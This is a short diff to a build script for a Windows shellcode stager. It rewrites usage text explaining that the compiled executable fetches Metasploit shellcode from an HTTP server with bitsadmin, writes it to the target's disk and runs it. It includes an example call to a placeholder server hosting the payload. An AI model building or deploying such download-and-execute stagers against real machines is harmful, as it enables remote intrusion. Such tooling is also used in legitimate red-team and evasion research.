@@ -56,16 +56,12 @@ strip output/downloadbitsadmin_revhttps_win32.exe
 # cleanup
 cleanup_techniques
 
-echo "The generated msf shellcode must be hosted on a HTTP server.
-Call your executable like:
-downloadbitsadmin_revhttps_win32.exe http://myserver/thepayload.bin
-The executable will then download the file via bitsadmin and drop it on the target's disk.
-The downloaded shellcode is then read from the file and executed."
 
-#USAGE_START
+echo "
 # The generated msf shellcode must be hosted on a HTTP server.
 # Call your executable like:
-# output.exe http://myserver/thepayload.bin
+# $ downloadbitsadmin_revhttps_win32.exe http://myserver/thepayload.bin
+
 # The executable will then download the file via bitsadmin and drop it on the target's disk.
 # The downloaded shellcode is then read from the file and executed.
-#USAGE_END
+"
